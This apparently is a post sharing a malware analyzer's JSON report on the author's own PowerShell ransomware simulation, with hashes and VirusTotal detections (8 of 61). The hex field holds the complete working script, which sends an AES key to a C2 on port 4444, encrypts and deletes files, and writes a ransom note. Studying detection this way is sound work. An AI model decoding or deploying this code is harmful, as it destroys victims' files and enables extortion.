## Below is the JSON output of running the enhancedAnalyzer.py against a ransomware_simulation PowerShell script I created.  Before running this I went ahead and uploaded the payload to virustotal to see the results.  Only 8/61 security vendors found this ransomEncryption.ps1 file to be mailicious.
**I have purposely left out the last octet of the C2 server**
``` 
Checking VirusTotal for af3151aac523dc56ca2a6da9ca37bcdec565b378e27a511f287fc326fe6ab532...
Checking IBM X-Force for af3151aac523dc56ca2a6da9ca37bcdec565b378e27a511f287fc326fe6ab532...
Checking AbuseIPDB for 192.168.1.?????...
Checking Shodan for 192.168.1.?????...
Checking AlienVault for 192.168.1.?????...
{
    "basic_analysis": {
        "length": 3671,
        "entropy": 4.787720704433651,
        "hex_representation": "232052616e736f6d776172652053696d756c6174696f6e205363726970742028466f7220456475636174696f6e616c20507572706f736573204f6e6c79290d0a247461726765744469726563746f7279203d2022433a5c55736572735c73703333645c4f6e6544726976655c446f63756d656e74735c74657374657231220d0a0d0a0d0a232047656e657261746520414553204b65790d0a66756e6374696f6e2047656e65726174652d4145534b6579207b0d0a2020202024616573203d205b53797374656d2e53656375726974792e43727970746f6772617068792e4165735d3a3a43726561746528290d0a20202020246165732e4b657953697a65203d203132380d0a20202020246165732e47656e65726174654b657928290d0a2020202072657475726e20246165732e4b65790d0a7d0d0a0d0a232053656e64204b657920746f205365727665720d0a66756e6374696f6e2053656e642d4b6579546f53657276657228246b657929207b0d0a20202020247365727665724950203d20223139322e3136382e312e333822202023205265706c61636520776974682061637475616c204b616c692049500d0a2020202024736572766572506f7274203d20343434340d0a0d0a20202020747279207b0d0a202020202020202057726974652d486f737420225b2a5d20547279696e6720746f20636f6e6e65637420746f20247365727665724950203a2024736572766572506f7274220d0a202020202020202024636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e536f636b6574732e546370436c69656e740d0a202020202020202024636c69656e742e436f6e6e656374282473657276657249502c2024736572766572506f7274290d0a20202020202020200d0a20202020202020206966202824636c69656e742e436f6e6e656374656429207b0d0a20202020202020202020202057726974652d486f737420225b2b5d20436f6e6e656374696f6e2065737461626c697368656420746f20433220736572766572220d0a2020202020202020202020202473747265616d203d2024636c69656e742e47657453747265616d28290d0a20202020202020202020202024777269746572203d204e65772d4f626a6563742053797374656d2e494f2e53747265616d577269746572282473747265616d290d0a2020202020202020202020200d0a202020202020202020202020232053656e64206b6579206173204261736536340d0a202020202020202020202020246261736536344b6579203d205b53797374656d2e436f6e766572745d3a3a546f426173653634537472696e6728246b6579290d0a202020202020202020202020247772697465722e577269746528246261736536344b6579290d0a202020202020202020202020247772697465722e466c75736828290d0a2020202020202020202020200d0a20202020202020202020202057726974652d486f737420225b2a5d204b65792073656e74207375636365737366756c6c79220d0a20202020202020202020202053746172742d536c656570202d5365636f6e6473203120202320416c6c6f772074696d6520666f72207472616e736d697373696f6e0d0a20202020202020207d0d0a2020202020202020656c7365207b0d0a20202020202020202020202057726974652d486f737420225b215d20436f6e6e656374696f6e206661696c6564220d0a20202020202020207d0d0a202020207d0d0a202020206361746368207b0d0a202020202020202057726974652d486f737420225b215d204572726f723a20245f220d0a202020207d0d0a2020202066696e616c6c79207b0d0a2020202020202020696620282477726974657229207b20247772697465722e446973706f73652829207d0d0a2020202020202020696620282473747265616d29207b202473747265616d2e446973706f73652829207d0d0a20202020202020206966202824636c69656e7429207b2024636c69656e742e436c6f73652829207d0d0a202020207d0d0a7d0d0a0d0a232046696c6520456e6372797074696f6e2046756e6374696f6e0d0a66756e6374696f6e20456e63727970742d46696c65282466696c65506174682c20246b657929207b0d0a20202020747279207b0d0a2020202020202020232047656e65726174652072616e646f6d2049560d0a202020202020202024616573203d205b53797374656d2e53656375726974792e43727970746f6772617068792e4165735d3a3a43726561746528290d0a2020202020202020246165732e4b6579203d20246b65790d0a2020202020202020246165732e47656e6572617465495628290d0a2020202020202020246976203d20246165732e49560d0a0d0a2020202020202020232043726561746520656e63727970746f720d0a202020202020202024656e63727970746f72203d20246165732e437265617465456e63727970746f7228290d0a20202020202020200d0a20202020202020202320526561642066696c6520636f6e74656e740d0a20202020202020202466696c65436f6e74656e74203d205b53797374656d2e494f2e46696c655d3a3a52656164416c6c4279746573282466696c6550617468290d0a20202020202020200d0a20202020202020202320456e637279707420636f6e74656e740d0a202020202020202024656e63727970746564436f6e74656e74203d2024656e63727970746f722e5472616e73666f726d46696e616c426c6f636b282466696c65436f6e74656e742c20302c202466696c65436f6e74656e742e4c656e677468290d0a20202020202020200d0a202020202020202023205772697465204956202b20656e6372797074656420636f6e74656e740d0a20202020202020205b53797374656d2e494f2e46696c655d3a3a5772697465416c6c427974657328222466696c65506174682e656e63222c20246976202b2024656e63727970746564436f6e74656e74290d0a20202020202020200d0a2020202020202020232052656d6f7665206f726967696e616c2066696c650d0a202020202020202052656d6f76652d4974656d202466696c6550617468202d466f7263650d0a20202020202020200d0a202020202020202057726974652d486f737420225b2a5d20456e637279707465643a202466696c6550617468220d0a202020207d0d0a202020206361746368207b0d0a202020202020202057726974652d486f737420225b215d204572726f7220656e6372797074696e67202466696c6550617468203a20245f220d0a202020207d0d0a2020202066696e616c6c79207b0d0a2020202020202020696620282461657329207b20246165732e446973706f73652829207d0d0a202020207d0d0a7d0d0a0d0a23204469726563746f727920456e6372797074696f6e0d0a66756e6374696f6e20456e63727970742d4469726563746f72792824706174682c20246b657929207b0d0a202020204765742d4368696c644974656d202d50617468202470617468202d52656375727365202d46696c65207c20466f72456163682d4f626a656374207b0d0a2020202020202020696620282d6e6f7420245f2e46756c6c4e616d652e456e64735769746828222e656e63222929207b0d0a202020202020202020202020456e63727970742d46696c6520245f2e46756c6c4e616d6520246b65790d0a20202020202020207d0d0a202020207d0d0a7d0d0a0d0a23204372656174652052616e736f6d204e6f74650d0a66756e6374696f6e204372656174652d52616e736f6d4e6f746528247061746829207b0d0a20202020246e6f7465436f6e74656e74203d2040220d0a596f75722066696c65732068617665206265656e20656e63727970746564210d0a546f207265636f766572207468656d2c2073656e64203130302c30303020584c4d20746f2074686520616464726573733a20594f55525f57414c4c45545f414444524553530d0a4166746572207061796d656e742c20656d61696c20796f7572207472616e73616374696f6e20494420746f206875676f40676d61696c2e636f6d0d0a55706f6e20766572696669636174696f6e2c20796f752077696c6c20726563656976652064656372797074696f6e20696e737472756374696f6e732e0d0a22400d0a20202020246e6f746550617468203d204a6f696e2d506174682024706174682022524541444d455f5245434f5645525f46494c45532e747874220d0a20202020246e6f7465436f6e74656e74207c204f75742d46696c65202d46696c655061746820246e6f7465506174680d0a2020202057726974652d486f737420225b2a5d2052616e736f6d206e6f746520637265617465642061743a20246e6f746550617468220d0a7d0d0a0d0a23204d61696e20457865637574696f6e0d0a747279207b0d0a20202020232047656e657261746520616e642073656e64206b65790d0a20202020246165734b6579203d2047656e65726174652d4145534b65790d0a2020202053656e642d4b6579546f53657276657220246165734b65790d0a0d0a202020202320456e63727970742066696c65730d0a2020202069662028546573742d5061746820247461726765744469726563746f727929207b0d0a202020202020202057726974652d486f737420225b2a5d205374617274696e6720656e6372797074696f6e206f663a20247461726765744469726563746f7279220d0a2020202020202020456e63727970742d4469726563746f727920247461726765744469726563746f727920246165734b65790d0a20202020202020204372656174652d52616e736f6d4e6f746520247461726765744469726563746f72790d0a202020207d0d0a20202020656c7365207b0d0a202020202020202057726974652d486f737420225b215d20546172676574206469726563746f7279206e6f7420666f756e64220d0a202020207d0d0a7d0d0a6361746368207b0d0a2020202057726974652d486f737420225b215d20437269746963616c206572726f723a20245f220d0a7d"
    },
    "forensic_analysis": {
        "hashes": {
            "md5": "3c2924970425a1f3f3a4c71a0d028c21",
            "sha1": "7c73942217c6213afd09d95e62c203356129ecf2",
            "sha256": "af3151aac523dc56ca2a6da9ca37bcdec565b378e27a511f287fc326fe6ab532"
        },
        "embedded_ips": [
            "192.168.1.????"
        ],
        "embedded_urls": [],
        "embedded_domains": [
            "Cryptography.",
            "aes.",
            "aes.",
            "aes.",
            "Sockets.",
            "client.",
            "client.",
            "client.",
            "IO.",
            "System.",
            "writer.",
            "writer.",
            "writer.",
            "stream.",
            "client.",
            "Cryptography.",
            "aes.",
            "aes.",
            "aes.",
            "aes.",
            "IO.",
            "encryptor.",
            "fileContent.",
            "IO.",
            "filePath.",
            "aes.",
            "FullName.",
            "gmail.",
            "FILES."
        ]
    },
    "threat_intel": {
        "virustotal": {
            "id": "af3151aac523dc56ca2a6da9ca37bcdec565b378e27a511f287fc326fe6ab532",
            "type": "file",
            "links": {
                "self": "https://www.virustotal.com/api/v3/files/af3151aac523dc56ca2a6da9ca37bcdec565b378e27a511f287fc326fe6ab532"
            },
            "attributes": {
                "powershell_info": {
                    "dotnet_calls": [
                        "System.Convert",
                        "System.IO.File",
                        "System.Security.Cryptography.Aes"
                    ],
                    "cmdlets": [
                        "foreach-object",
                        "get-childitem",
                        "join-path",
                        "new-object",
                        "out-file",
                        "remove-item",
                        "start-sleep",
                        "test-path",
                        "write-host"
                    ],
                    "functions": [
                        "Create-RansomNote",
                        "Encrypt-Directory",
                        "Encrypt-File",
                        "Generate-AESKey",
                        "Send-KeyToServer"
                    ]
                },
                "popular_threat_classification": {
                    "suggested_threat_label": "boxter",
                    "popular_threat_name": [
                        {
                            "count": 8,
                            "value": "boxter"
                        }
                    ]
                },
                "last_analysis_date": 1738694902,
                "reputation": 0,
                "first_submission_date": 1738694902,
                "sha256": "af3151aac523dc56ca2a6da9ca37bcdec565b378e27a511f287fc326fe6ab532",
                "type_tags": [
                    "source",
                    "powershell",
                    "ps",
                    "ps1"
                ],
                "type_description": "Powershell",
                "vhash": "8197c6e52295083a4ff93aeed3868b44",
                "magic": "ASCII text, with CRLF line terminators",
                "size": 3671,
                "ssdeep": "48:xaLfGumCOf41xsifXr+OSB9zpRoYRgZZSfJ8x+Nl03ILShW:xvGOf41WifXa31DLr03I+4",
                "tags": [
                    "powershell",
                    "detect-debug-environment",
                    "long-sleeps"
                ],
                "type_extension": "ps1",
                "magika": "POWERSHELL",
                "sandbox_verdicts": {
                    "C2AE": {
                        "category": "undetected",
                        "malware_classification": [
                            "UNKNOWN_VERDICT"
                        ],
                        "sandbox_name": "C2AE"
                    }
                },
                "names": [
                    "ransomEncryption.ps1"
                ],
                "tlsh": "T1037111283A02EA5907B383729D27E404EEB5113F82065A157A8CD6C57FB151D83E9FF9",
                "last_submission_date": 1738694902,
                "sha1": "7c73942217c6213afd09d95e62c203356129ecf2",
                "times_submitted": 1,
                "unique_sources": 1,
                "filecondis": {
                    "raw_md5": "64d62bd6edf5f597cae56d702da61799",
                    "dhash": "fcacb49c98848080"
                },
                "type_tag": "powershell",
                "total_votes": {
                    "harmless": 0,
                    "malicious": 0
                },
                "last_modification_date": 1738786077,
                "last_analysis_stats": {
                    "malicious": 8,
                    "suspicious": 0,
                    "undetected": 53,
                    "harmless": 0,
                    "timeout": 0,
                    "confirmed-timeout": 0,
                    "failure": 0,
                    "type-unsupported": 14
                },
                "last_analysis_results": {
                    "Bkav": {
                        "method": "blacklist",
                        "engine_name": "Bkav",
                        "engine_version": "2.0.0.1",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Lionic": {
                        "method": "blacklist",
                        "engine_name": "Lionic",
                        "engine_version": "8.16",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Cynet": {
                        "method": "blacklist",
                        "engine_name": "Cynet",
                        "engine_version": "4.0.3.4",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "CTX": {
                        "method": "blacklist",
                        "engine_name": "CTX",
                        "engine_version": "2024.8.29.1",
                        "engine_update": "20250204",
                        "category": "malicious",
                        "result": "powershell.unknown.boxter"
                    },
                    "CAT-QuickHeal": {
                        "method": "blacklist",
                        "engine_name": "CAT-QuickHeal",
                        "engine_version": "22.00",
                        "engine_update": "20250203",
                        "category": "undetected",
                        "result": null
                    },
                    "Skyhigh": {
                        "method": "blacklist",
                        "engine_name": "Skyhigh",
                        "engine_version": "v2021.2.0+4045",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "ALYac": {
                        "method": "blacklist",
                        "engine_name": "ALYac",
                        "engine_version": "2.0.0.10",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Malwarebytes": {
                        "method": "blacklist",
                        "engine_name": "Malwarebytes",
                        "engine_version": "4.5.5.54",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Zillya": {
                        "method": "blacklist",
                        "engine_name": "Zillya",
                        "engine_version": "2.0.0.5293",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "K7AntiVirus": {
                        "method": "blacklist",
                        "engine_name": "K7AntiVirus",
                        "engine_version": "12.216.54713",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "K7GW": {
                        "method": "blacklist",
                        "engine_name": "K7GW",
                        "engine_version": "12.216.54710",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "CrowdStrike": {
                        "method": "blacklist",
                        "engine_name": "CrowdStrike",
                        "engine_version": "1.0",
                        "engine_update": "20230417",
                        "category": "undetected",
                        "result": null
                    },
                    "Arcabit": {
                        "method": "blacklist",
                        "engine_name": "Arcabit",
                        "engine_version": "2022.0.0.18",
                        "engine_update": "20250204",
                        "category": "malicious",
                        "result": "Heur.BZC.PZQ.Boxter.1031.A83E41B3"
                    },
                    "huorong": {
                        "method": "blacklist",
                        "engine_name": "huorong",
                        "engine_version": "1e33cf3:1e33cf3:2292584:2292584",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Baidu": {
                        "method": "blacklist",
                        "engine_name": "Baidu",
                        "engine_version": "1.0.0.2",
                        "engine_update": "20190318",
                        "category": "undetected",
                        "result": null
                    },
                    "VirIT": {
                        "method": "blacklist",
                        "engine_name": "VirIT",
                        "engine_version": "9.5.884",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Symantec": {
                        "method": "blacklist",
                        "engine_name": "Symantec",
                        "engine_version": "1.22.0.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "ESET-NOD32": {
                        "method": "blacklist",
                        "engine_name": "ESET-NOD32",
                        "engine_version": "30661",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "TrendMicro-HouseCall": {
                        "method": "blacklist",
                        "engine_name": "TrendMicro-HouseCall",
                        "engine_version": "10.0.0.1040",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Avast": {
                        "method": "blacklist",
                        "engine_name": "Avast",
                        "engine_version": "23.9.8494.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "ClamAV": {
                        "method": "blacklist",
                        "engine_name": "ClamAV",
                        "engine_version": "1.4.2.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Kaspersky": {
                        "method": "blacklist",
                        "engine_name": "Kaspersky",
                        "engine_version": "22.0.1.28",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "BitDefender": {
                        "method": "blacklist",
                        "engine_name": "BitDefender",
                        "engine_version": "7.2",
                        "engine_update": "20250204",
                        "category": "malicious",
                        "result": "Heur.BZC.PZQ.Boxter.1031.A83E41B3"
                    },
                    "NANO-Antivirus": {
                        "method": "blacklist",
                        "engine_name": "NANO-Antivirus",
                        "engine_version": "1.0.146.25796",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "ViRobot": {
                        "method": "blacklist",
                        "engine_name": "ViRobot",
                        "engine_version": "2014.3.20.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "MicroWorld-eScan": {
                        "method": "blacklist",
                        "engine_name": "MicroWorld-eScan",
                        "engine_version": "14.0.409.0",
                        "engine_update": "20250204",
                        "category": "malicious",
                        "result": "Heur.BZC.PZQ.Boxter.1031.A83E41B3"
                    },
                    "Rising": {
                        "method": "blacklist",
                        "engine_name": "Rising",
                        "engine_version": "25.0.0.28",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Emsisoft": {
                        "method": "blacklist",
                        "engine_name": "Emsisoft",
                        "engine_version": "2024.8.0.61147",
                        "engine_update": "20250204",
                        "category": "malicious",
                        "result": "Heur.BZC.PZQ.Boxter.1031.A83E41B3 (B)"
                    },
                    "F-Secure": {
                        "method": "blacklist",
                        "engine_name": "F-Secure",
                        "engine_version": "18.10.1547.307",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "DrWeb": {
                        "method": "blacklist",
                        "engine_name": "DrWeb",
                        "engine_version": "7.0.65.5230",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "VIPRE": {
                        "method": "blacklist",
                        "engine_name": "VIPRE",
                        "engine_version": "6.0.0.35",
                        "engine_update": "20250204",
                        "category": "malicious",
                        "result": "Heur.BZC.PZQ.Boxter.1031.A83E41B3"
                    },
                    "TrendMicro": {
                        "method": "blacklist",
                        "engine_name": "TrendMicro",
                        "engine_version": "11.0.0.1006",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "CMC": {
                        "method": "blacklist",
                        "engine_name": "CMC",
                        "engine_version": "2.4.2022.1",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Sophos": {
                        "method": "blacklist",
                        "engine_name": "Sophos",
                        "engine_version": "2.5.5.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Ikarus": {
                        "method": "blacklist",
                        "engine_name": "Ikarus",
                        "engine_version": "6.3.30.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "FireEye": {
                        "method": "blacklist",
                        "engine_name": "FireEye",
                        "engine_version": "35.47.0.0",
                        "engine_update": "20250204",
                        "category": "malicious",
                        "result": "Heur.BZC.PZQ.Boxter.1031.A83E41B3"
                    },
                    "Jiangmin": {
                        "method": "blacklist",
                        "engine_name": "Jiangmin",
                        "engine_version": "16.0.100",
                        "engine_update": "20250203",
                        "category": "undetected",
                        "result": null
                    },
                    "Varist": {
                        "method": "blacklist",
                        "engine_name": "Varist",
                        "engine_version": "6.6.1.3",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Avira": {
                        "method": "blacklist",
                        "engine_name": "Avira",
                        "engine_version": "8.3.3.20",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Antiy-AVL": {
                        "method": "blacklist",
                        "engine_name": "Antiy-AVL",
                        "engine_version": "3.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Kingsoft": {
                        "method": "blacklist",
                        "engine_name": "Kingsoft",
                        "engine_version": "None",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Gridinsoft": {
                        "method": "blacklist",
                        "engine_name": "Gridinsoft",
                        "engine_version": "1.0.207.174",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Xcitium": {
                        "method": "blacklist",
                        "engine_name": "Xcitium",
                        "engine_version": "37445",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Microsoft": {
                        "method": "blacklist",
                        "engine_name": "Microsoft",
                        "engine_version": "1.1.24090.11",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "SUPERAntiSpyware": {
                        "method": "blacklist",
                        "engine_name": "SUPERAntiSpyware",
                        "engine_version": "5.6.0.1032",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "GData": {
                        "method": "blacklist",
                        "engine_name": "GData",
                        "engine_version": "A:25.39757B:27.39148",
                        "engine_update": "20250204",
                        "category": "malicious",
                        "result": "Heur.BZC.PZQ.Boxter.1031.A83E41B3"
                    },
                    "Google": {
                        "method": "blacklist",
                        "engine_name": "Google",
                        "engine_version": "1738693831",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "AhnLab-V3": {
                        "method": "blacklist",
                        "engine_name": "AhnLab-V3",
                        "engine_version": "3.27.0.10558",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Acronis": {
                        "method": "blacklist",
                        "engine_name": "Acronis",
                        "engine_version": "1.2.0.121",
                        "engine_update": "20240328",
                        "category": "undetected",
                        "result": null
                    },
                    "McAfee": {
                        "method": "blacklist",
                        "engine_name": "McAfee",
                        "engine_version": "6.0.6.653",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "TACHYON": {
                        "method": "blacklist",
                        "engine_name": "TACHYON",
                        "engine_version": "2025-02-04.02",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "VBA32": {
                        "method": "blacklist",
                        "engine_name": "VBA32",
                        "engine_version": "5.3.1",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Zoner": {
                        "method": "blacklist",
                        "engine_name": "Zoner",
                        "engine_version": "2.2.2.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Tencent": {
                        "method": "blacklist",
                        "engine_name": "Tencent",
                        "engine_version": "1.0.0.1",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Yandex": {
                        "method": "blacklist",
                        "engine_name": "Yandex",
                        "engine_version": "5.5.2.24",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "SentinelOne": {
                        "method": "blacklist",
                        "engine_name": "SentinelOne",
                        "engine_version": "25.1.1.1",
                        "engine_update": "20250114",
                        "category": "undetected",
                        "result": null
                    },
                    "MaxSecure": {
                        "method": "blacklist",
                        "engine_name": "MaxSecure",
                        "engine_version": "1.0.0.1",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Fortinet": {
                        "method": "blacklist",
                        "engine_name": "Fortinet",
                        "engine_version": "None",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "AVG": {
                        "method": "blacklist",
                        "engine_name": "AVG",
                        "engine_version": "23.9.8494.0",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "Panda": {
                        "method": "blacklist",
                        "engine_name": "Panda",
                        "engine_version": "4.6.4.2",
                        "engine_update": "20250204",
                        "category": "undetected",
                        "result": null
                    },
                    "alibabacloud": {
                        "method": "blacklist",
                        "engine_name": "alibabacloud",
                        "engine_version": "2.2.0",
                        "engine_update": "20241030",
                        "category": "undetected",
                        "result": null
                    },
                    "McAfeeD": {
                        "method": "blacklist",
                        "engine_name": "McAfeeD",
                        "engine_version": "1.2.0.7977",
                        "engine_update": "20250204",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "Avast-Mobile": {
                        "method": "blacklist",
                        "engine_name": "Avast-Mobile",
                        "engine_version": "250204-02",
                        "engine_update": "20250204",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "SymantecMobileInsight": {
                        "method": "blacklist",
                        "engine_name": "SymantecMobileInsight",
                        "engine_version": "2.0",
                        "engine_update": "20250124",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "BitDefenderFalx": {
                        "method": "blacklist",
                        "engine_name": "BitDefenderFalx",
                        "engine_version": "2.0.936",
                        "engine_update": "20241203",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "Elastic": {
                        "method": "blacklist",
                        "engine_name": "Elastic",
                        "engine_version": "4.0.184",
                        "engine_update": "20250129",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "tehtris": {
                        "method": "blacklist",
                        "engine_name": "tehtris",
                        "engine_version": null,
                        "engine_update": "20250204",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "Webroot": {
                        "method": "blacklist",
                        "engine_name": "Webroot",
                        "engine_version": "1.9.0.8",
                        "engine_update": "20240910",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "APEX": {
                        "method": "blacklist",
                        "engine_name": "APEX",
                        "engine_version": "6.620",
                        "engine_update": "20250204",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "Paloalto": {
                        "method": "blacklist",
                        "engine_name": "Paloalto",
                        "engine_version": "0.9.0.1003",
                        "engine_update": "20250204",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "Alibaba": {
                        "method": "blacklist",
                        "engine_name": "Alibaba",
                        "engine_version": "0.3.0.5",
                        "engine_update": "20190527",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "Trapmine": {
                        "method": "blacklist",
                        "engine_name": "Trapmine",
                        "engine_version": "4.0.3.0",
                        "engine_update": "20250113",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "Cylance": {
                        "method": "blacklist",
                        "engine_name": "Cylance",
                        "engine_version": "3.0.0.0",
                        "engine_update": "20250109",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "Trustlook": {
                        "method": "blacklist",
                        "engine_name": "Trustlook",
                        "engine_version": "1.0",
                        "engine_update": "20250204",
                        "category": "type-unsupported",
                        "result": null
                    },
                    "DeepInstinct": {
                        "method": "blacklist",
                        "engine_name": "DeepInstinct",
                        "engine_version": "5.0.0.8",
                        "engine_update": "20250202",
                        "category": "type-unsupported",
                        "result": null
                    }
                },
                "md5": "3c2924970425a1f3f3a4c71a0d028c21",
                "meaningful_name": "ransomEncryption.ps1",
                "trid": [
                    {
                        "file_type": "file seems to be plain text/ASCII",
                        "probability": 0.0
                    }
                ],
                "crowdsourced_ai_results": [
                    {
                        "source": "uma",
                        "analysis": "The provided PowerShell code is a ransomware simulation script that demonstrates the functionality of encrypting files in a specified directory and creating a ransom note. The script begins by defining a target directory where it will perform its operations. It includes several functions:\n\n1. Generate-AESKey: This function generates a 128-bit AES encryption key.\n2. Send-KeyToServer: This function establishes a TCP connection to a specified server (indicated as a command-and-control server) and sends the generated AES key encoded in Base64 format.\n3. Encrypt-File: This function takes a file path and an AES key, generates a random initialization vector (IV), encrypts the file's content using the AES algorithm, writes the IV along with the encrypted content to a new file (with an \".enc\" extension), and deletes the original file.\n4. Encrypt-Directory: This function recursively encrypts all files in the specified directory, ensuring that it does not re-encrypt files that have already been encrypted (those ending with \".enc\").\n5. Create-RansomNote: This function creates a ransom note in the target directory, informing the victim that their files have been encrypted and providing instructions for payment to recover them.\n\nIn the main execution block, the script generates an AES key, sends it to the designated server, checks if the target directory exists, and then proceeds to encrypt the files within that directory while also creating a ransom note.\n\nOverall, the behavior of this code aligns with typical ransomware activities, including file encryption, communication with a remote server, and the creation of a ransom demand, which categorizes it as malicious despite any claims of being for \"educational purposes.\"",
                        "verdict": "malicious",
                        "category": "code_insight",
                        "id": "af3151aac523dc56ca2a6da9ca37bcdec565b378e27a511f287fc326fe6ab532-file-uma"
                    },
                    {
                        "source": "palm",
                        "analysis": "The script performs file encryption and exfiltration of an encryption key.  It defines functions for AES key generation (`Generate-AESKey`), sending the key to a remote server (`Send-KeyToServer`), encrypting individual files (`Encrypt-File`), recursively encrypting a directory (`Encrypt-Directory`), and creating a ransom note (`Create-RansomNote`).  The `Send-KeyToServer` function establishes a TCP connection to a specified IP address (192.168.1.?????) and port (4444), sending the Base64 encoded AES key. The `Encrypt-Directory` function iterates through files in a specified directory (\"C:\\Users\\sp33d\\OneDrive\\Documents\\tester1\"), encrypting each file using AES with the generated key and appending \".enc\" to the file name. The original files are then deleted.  A ransom note is created in the target directory.  The main execution block orchestrates these functions, handling exceptions along the way. The script downloads no files from a remote location.",
                        "category": "code_insight",
                        "id": "af3151aac523dc56ca2a6da9ca37bcdec565b378e27a511f287fc326fe6ab532-file-palm"
                    }
                ]
            }
        },
        "ibm_xforce": "No record",
        "abuseipdb": {
            "192.168.1.?????": "No record"
        },
        "shodan": {
            "192.168.1.?????": "No record"
        },
        "alienvault": {
            "192.168.1.?????": "No record"
        }
    },
    "ai_prediction": 0
}
```
